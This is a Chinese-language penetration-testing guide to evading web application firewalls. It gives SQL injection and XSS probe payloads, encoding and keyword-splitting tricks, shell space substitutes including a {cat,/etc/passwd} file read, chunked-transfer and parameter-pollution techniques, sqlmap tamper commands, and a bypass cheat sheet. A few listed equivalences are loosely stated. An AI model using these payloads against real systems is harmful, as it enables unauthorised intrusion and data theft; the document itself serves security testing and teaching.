# WAF 绕过技术方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供 WAF（Web 应用防火墙）绕过技术的系统化方法，帮助在存在防护机制的环境中成功检测和利用注入漏洞。

## 1.2 适用范围
适用于存在 WAF、IPS、IDS 等安全防护的环境，包括云 WAF（Cloudflare、AWS WAF）、硬件 WAF、软件 WAF（ModSecurity）等。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：WAF 绕过技术

### 2.1 技术介绍

WAF 绕过是指通过特定的技术手段，绕过 Web 应用防火墙的检测和拦截，成功将恶意 Payload 发送到目标应用。绕过方法包括编码绕过、分块传输、协议绕过、逻辑绕过等。

### 2.2 WAF 检测

#### 2.2.1 WAF 识别方法

**响应特征识别：**

| WAF 产品 | 响应特征 |
|---------|---------|
| **Cloudflare** | Server: cloudflare, CF-RAY 头 |
| **AWS WAF** | x-amzn-RequestId 头 |
| **ModSecurity** | 403 响应，ModSecurity 错误信息 |
| **F5 BIG-IP** | BIGipServer Cookie |
| **Imperva** | Incap-Request-ID 头 |
| **Akamai** | X-Akamai-Transformed 头 |
| **360 WAF** | 360wzws 头 |
| **阿里云 WAF** | X-Cache 头 |

**探测 Payload：**
```
# 基础探测
?id=1'
?id=1 AND 1=1
?id=1<script>alert(1)</script>

# 观察响应
- 403 Forbidden
- 406 Not Acceptable
- 503 Service Unavailable
- 重定向到拦截页面
- 响应延迟明显增加
```

#### 2.2.2 WAF 规则分析

**规则类型分析：**
```
# 关键字过滤
测试：SELECT, UNION, DROP, script, alert

# 特殊字符过滤
测试：' " ; < > | & ` $ ( )

# 模式匹配
测试：SQL 语句结构、XSS 标签结构

# 频率限制
测试：短时间内大量请求
```

### 2.3 绕过技术

#### 2.3.1 编码绕过

**URL 编码：**
```
# 基础 URL 编码
' = %27
" = %22
空格 = %20
< = %3C
> = %3E

# 双重 URL 编码
' = %2527
" = %2522
空格 = %2520

# 三重 URL 编码
' = %252527
```

**Unicode 编码：**
```
# Unicode 编码
' = \u0027
" = \u0022
空格 = \u0020

# Unicode 变体
a = \u0061 = \u+0061 = %u0061
```

**Base64 编码：**
```
# Base64 编码 Payload
echo -n "payload" | base64
# 然后在目标上解码执行
```

**HTML 实体编码：**
```
# 十进制实体
< = &#60;
> = &#62;
" = &#34;

# 十六进制实体
< = &#x3C;
> = &#x3E;
" = &#x22;
```

#### 2.3.2 空格绕过

**替代字符：**
```
# Linux/Unix
空格 -> ${IFS}
空格 -> $IFS$9
空格 -> {cat,/etc/passwd}
空格 -> <> (重定向)
空格 -> < <(cmd)

# SQL
空格 -> /**/
空格 -> (括号)
空格 -> %09 (Tab)
空格 -> %0a (换行)
```

**示例：**
```sql
# 正常
SELECT * FROM users

# 绕过
SELECT/**/*/**/FROM/**/users
SELECT(1)FROM(users)
SELECT%09*%09FROM%09users
```

#### 2.3.3 关键字绕过

**双写绕过：**
```
# 如果过滤 SELECT
SESELECTLECT * FROM users

# 如果过滤 UNION
UNUNIONION SELECT 1,2,3--

# 如果过滤 script
scrscriptipt
```

**内联注释绕过：**
```sql
# 如果过滤 SELECT
S/**/E/**/L/**/E/**/C/**/T

# 如果过滤 UNION
U/**/N/**/I/**/O/**/N/**/
```

**大小写混合：**
```
# 如果过滤小写
SELECT -> SeLeCt, sElEcT, SELECT

# 如果过滤大写
SELECT -> select, SelEct
```

#### 2.3.4 分块传输绕过

**HTTP 分块传输：**
```
POST /target HTTP/1.1
Transfer-Encoding: chunked

5
hello
0

# 恶意 Payload 分块发送
```

**分块 Payload 示例：**
```
# 将 Payload 分成多个块
块 1: SEL
块 2: ECT
块 3: * F
块 4: ROM
```

#### 2.3.5 协议绕过

**HTTP 方法绕过：**
```
# 如果只过滤 GET
POST /search?q=payload

# 使用不常见方法
PATCH /api/user
PUT /api/data
```

**Content-Type 绕过：**
```
# 变换 Content-Type
Content-Type: application/json
Content-Type: application/xml
Content-Type: multipart/form-data
Content-Type: application/x-www-form-urlencoded
```

**HTTP 版本绕过：**
```
# 使用 HTTP/1.0
GET /page?id=1 HTTP/1.0

# 使用 HTTP/2
```

#### 2.3.6 参数污染绕过

**HPP（HTTP 参数污染）：**
```
# 多个同名参数
?id=1&id=2&id=3

# WAF 可能只检查第一个
?id=1' OR '1'='1&id=1

# 后端可能取最后一个
?id=1&id=1' OR '1'='1--
```

#### 2.3.7 逻辑绕过

**等价表达式：**
```sql
# AND 绕过
AND -> &&
AND -> &
AND -> AND(true)

# OR 绕过
OR -> ||
OR -> |

# = 绕过
= -> LIKE
= -> REGEXP
= -> BETWEEN
```

**函数替代：**
```sql
# substring 替代
substring() -> mid()
substring() -> substr()

# version 替代
version() -> @@version
version() -> v$version

# user 替代
user() -> current_user
user() -> system_user
```

#### 2.3.8 无字符绕过

**十六进制编码：**
```sql
# 字符串转十六进制
SELECT * FROM users WHERE name = 'admin'
SELECT * FROM users WHERE name = 0x61646d696e

# 表名/列名编码
SELECT table_name FROM information_schema.tables
SELECT 0x7461626c655f6e616d65 FROM ...
```

**字符拼接：**
```sql
# 使用 concat
SELECT CONCAT('se','lect')

# 使用 chr/char
SELECT CHAR(115,101,108,101,99,116)
```

### 2.4 工具辅助绕过

#### 2.4.1 SQLMap Tamper 脚本

```bash
# 使用 Tamper 脚本
sqlmap -u "http://target/page?id=1" --tamper=space2comment
sqlmap -u "http://target/page?id=1" --tamper=between
sqlmap -u "http://target/page?id=1" --tamper=charencode
sqlmap -u "http://target/page?id=1" --tamper=randomcase

# 多个 Tamper 脚本
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between,randomcase
```

**常用 Tamper 脚本：**
| 脚本名 | 功能 |
|-------|------|
| `space2comment` | 空格转注释 |
| `between` | AND 转 BETWEEN |
| `charencode` | 字符编码 |
| `randomcase` | 随机大小写 |
| `uppercase` | 转大写 |
| `lowercase` | 转小写 |
| `charunicodeencode` | Unicode 编码 |
| `percentage` | 添加% |

#### 2.4.2 Burp Suite 插件

- **Hackvertor** - 编码/解码
- **Payload Parser** - Payload 处理
- **Turbo Intruder** - 高速请求
- **Bypass WAF** - 自动绕过

### 2.5 绕过测试流程

```
1. WAF 识别
   └── 确定 WAF 产品和版本

2. 规则分析
   └── 测试过滤规则
   └── 确定过滤模式

3. 选择绕过方法
   └── 编码绕过
   └── 分块传输
   └── 协议绕过
   └── 逻辑绕过

4. 测试验证
   └── 确认绕过成功
   └── 调整 Payload

5. 漏洞利用
   └── 执行实际攻击
```

---

# 第三部分：附录

## 3.1 WAF 绕过 Payload 速查表

| 类型 | 原始 Payload | 绕过 Payload |
|-----|-------------|-------------|
| **URL 编码** | `' OR '1'='1` | `%27%20OR%20%271%27%3D%271` |
| **双重编码** | `' OR '1'='1` | `%2527%2520OR%2520%25271%2527` |
| **Unicode** | `' OR '1'='1` | `\u0027 OR \u00271\u0027` |
| **空格注释** | `SELECT *` | `SELECT/**/*` |
| **大小写** | `UNION SELECT` | `UnIoN SeLeCt` |
| **双写** | `UNION` | `UNUNIONION` |
| **十六进制** | `'admin'` | `0x61646d696e` |
| **字符函数** | `'admin'` | `CHAR(97,100,109,105,110)` |

## 3.2 参考资源

- [OWASP WAF Bypass](https://cheatsheetseries.owasp.org/cheatsheets/WAF_Bypass_Cheat_Sheet.html)
- [SQLMap Tamper Scripts](https://sqlmap.org/)
- [PayloadsAllTheThings - WAF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/WAF%20Bypass)
- [PortSwigger - WAF Evasion](https://portswigger.net/web-security)
